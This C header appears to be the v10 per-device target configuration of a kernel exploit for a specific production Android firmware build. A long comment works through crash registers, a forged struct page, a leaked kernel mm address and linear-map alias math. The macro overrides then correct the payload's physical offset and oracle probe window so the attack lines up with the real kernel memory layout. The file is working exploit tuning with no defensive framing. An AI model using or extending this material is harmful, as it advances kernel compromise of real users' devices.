#include "../q6q-F9560ZCU3DZDP-v9/target.h"

/* v10: correct the linear-map alias math for the q6q guest-physical layout.
 *
 * Ground truth (from /proc/zoneinfo on the live device):
 *   Node 0, zone Normal: start_pfn 530144 -> RAM starts at phys 0x81720000,
 *   spanned 11004192 pages (~42 GB of phys address space), present ~2.9M
 *   pages (~11 GB usable; MemTotal 11381264 kB).  The region below
 *   0x81720000 is the gunyah_hyp_region + cpusys_vm + tags + xbl + aop + tme
 *   + smem reserved cascade, which has no linear-map PTEs (the v7/v8/v9
 *   probe faults prove pmd=0 there).
 *
 * The crash register math pins the kernel's __va: the v9 forged struct page
 * x22 = 0xfffffffe00042000 gives page_to_phys = 0x1080000 and the faulting
 * copy source x1 = 0xffffff8001080000 = PAGE_OFFSET + 0x1080000, i.e.
 * __va(phys) = PAGE_OFFSET + phys  (memstart = 0).  The payload's
 * P0_DATA_ALIAS_CONST / p0_data_alias subtract P0_PHYS_OFFSET
 * (0x80000000), placing every image alias 2 GB below its real VA.
 * Setting P0_PHYS_OFFSET = 0 makes P0_KERNEL_PHYS_DELTA = P0_KERNEL_PHYS_LOAD
 * = 0x80080000, so aliases become PAGE_OFFSET + phys - exactly the kernel's
 * mapping.  (This also explains the v8/v9 "high" mm/pipe addresses: the
 * leaked mm at +40.4 GB is real - phys 40.4 GB is inside the zone span.)
 *
 * The probe window must also avoid the reserved regions inside the image
 * span.  The kernel Image occupies phys [0x80080000, 0x82880000); mapped
 * zone RAM begins at 0x81720000 (image offset 0x16a0000) and pvm_fw starts
 * at 0x824a0000 (image offset 0x2420000).  v10 probes at image offset
 * 0x2400000 (phys 0x82480000, inside mapped RAM, 0x20000 below pvm_fw) with
 * the fingerprint table regenerated for key range [0x2210000, 0x2400000].
 */
#undef P0_PHYS_OFFSET
#define P0_PHYS_OFFSET 0ULL
#undef P0_ORACLE_PROBE_OFFSET
#define P0_ORACLE_PROBE_OFFSET 0x2400000ULL
#undef P0_FINGERPRINT_HEADER
#define P0_FINGERPRINT_HEADER \
  "targets/q6q-F9560ZCU3DZDP-v10/p0_fingerprint.h"
#undef BUILD_VARIANT_LABEL
#define BUILD_VARIANT_LABEL \
  "q6q-F9560ZCU3DZDP-app-production-v10-memstart0-zone-probe"
